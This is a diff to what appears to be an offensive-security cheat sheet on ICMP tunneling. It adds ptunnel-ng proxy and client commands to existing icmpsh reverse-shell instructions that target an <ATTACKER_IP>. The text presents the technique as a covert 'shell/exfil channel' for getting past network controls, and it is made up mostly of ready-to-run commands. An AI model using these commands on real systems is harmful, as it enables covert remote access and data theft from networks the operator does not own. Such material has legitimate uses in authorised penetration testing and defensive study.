@@ -250,7 +250,16 @@ python2 icmpsh_m.py <ATTACKER_IP> <TARGET_IP>
 # Target (Windows): run the bundled client binary
 icmpsh.exe -t <ATTACKER_IP>
 ```
-The icmpsh slave/client is Windows-only (built against winsock2/iphlpapi and Win32 APIs such as IcmpSendEcho/CreateProcessA) — there is no Linux client build. On a Linux target, use a different ICMP-tunneling tool (e.g. ptunnel-ng) instead.
+The icmpsh slave/client is Windows-only (built against winsock2/iphlpapi and Win32 APIs such as IcmpSendEcho/CreateProcessA) — there is no Linux client build. On a Linux target, use **ptunnel-ng** instead — it tunnels a TCP connection inside ICMP echo packets (proxy + client model):
+```bash
+# PROXY: run on the end that terminates the tunnel and can reach the wanted TCP service.
+sudo ptunnel-ng                                   # no flags = proxy mode; listens for the ICMP tunnel
+# CLIENT: run on the other end; opens a local TCP port and ferries it through ICMP to the proxy,
+#   which connects onward to <dest_ip>:<dest_port>.
+sudo ptunnel-ng -p <PROXY_IP> -l 2222 -r <DEST_IP> -R 22
+#   -> now connecting to 127.0.0.1:2222 on the client reaches <DEST_IP>:22 entirely over ICMP.
+```
+Choose which host is proxy vs client by which end holds the ICMP-reachable position.
 Same framing as DNS tunneling — last resort, slow, use for a shell/exfil channel, not for wrapping tools.
 **Reference:** https://github.com/inquisb/icmpsh
 
